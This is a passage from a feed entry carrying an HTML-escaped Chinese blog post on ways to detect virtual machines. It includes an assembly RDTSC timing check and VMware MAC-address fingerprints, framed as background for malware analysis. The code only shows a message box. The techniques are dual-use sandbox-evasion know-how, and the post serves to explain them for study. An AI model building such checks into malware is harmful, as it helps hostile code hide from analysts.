class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.code&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RDTSC&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xchg    ecx, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RDTSC &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sub   eax, ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cmp   eax, 0FFh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        jg    Detected&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        invoke  MessageBox, 0, offset szOutsideVM, offset szTitle, 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ret&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Detected:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        invoke  MessageBox, 0, offset szInsideVM, offset szTitle, 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ret&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;end start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图8所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;              图8&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;方法七：利用虚拟硬件指纹检测虚拟机&quot;&gt;&lt;a href=&quot;#方法七：利用虚拟硬件指纹检测虚拟机&quot; class=&quot;headerlink&quot; title=&quot;方法七：利用虚拟硬件指纹检测虚拟机&quot;&gt;&lt;/a&gt;方法七：利用虚拟硬件指纹检测虚拟机&lt;/h3&gt;&lt;p&gt;利用虚拟硬件指纹也可用于检测虚拟机的存在，比如VMware默认的网卡MAC地址前缀为“00-05-69，00-0C-29或者00-50-56”，这前3节是由VMware分配的唯一标识符OUI，以供它的虚拟化适配器使用。在我的VMWare WinXP下的MAC地址为00-0C-29-5B-D7-67，如图9所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                                 图9&lt;br&gt;&lt;/center&gt;

&lt;p&gt;但由于这些可经过修改配置文件来绕过检测。另外，还可通过检测特定的硬件控制器，BIOS，USB控制器，显卡，网卡等特征字符串进行检测，这些在前面使用注册表检测方法中已有所涉及。另外之前在看雪论坛上也有朋友提到通过检测硬盘Model Number是否含有“vmware”或“virtual”等字样来实现检测虚拟机的功能，网址见这（附源码）：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=110046。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=110046。&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h3&gt;&lt;p&gt;国外SANS安全组织的研究人员总结出当前各种虚拟机检测手段不外乎以下四类：&lt;/p&gt;
&lt;p&gt;● 搜索虚拟环境中的进程，文件系统，注册表；&lt;br&gt;● 搜索虚拟环境中的内存&lt;br&gt;● 搜索虚拟环境中的特定虚拟硬件&lt;br&gt;● 搜索虚拟环境中的特定处理器指令和功能&lt;/p&gt;
&lt;p&gt;因为现代计算系统大多是由文件系统，内存，处理器及各种硬件组件构成的，上面提到的四种检测手段均包含了这些因素。纵观前面各种检测方法，也均在此四类当中。除此之外，也有人提出通过网络来检测虚拟机，比如搜索ICMP和TCP数据通讯的时间差异，IP ID数据包差异以及数据包中的异常头信息等等。随着技术研究的深入，相信会有更多的检测手段出现，与此同时，虚拟机厂商也会不断进化它们的产品，以增加anti-vmware的难度，这不也正是一场永无休止的无烟战争！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在当今信息安全领域，特别是恶意软件分析中，经常需要利用到虚拟机技术，以提高病毒分析过程的安全性以及硬件资源的节约性，因此它在恶意软件领域中是
    
    </summary>
    
    
      <category term="虚拟机" scheme="http://riusksk.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
  </entry>
  
</feed>
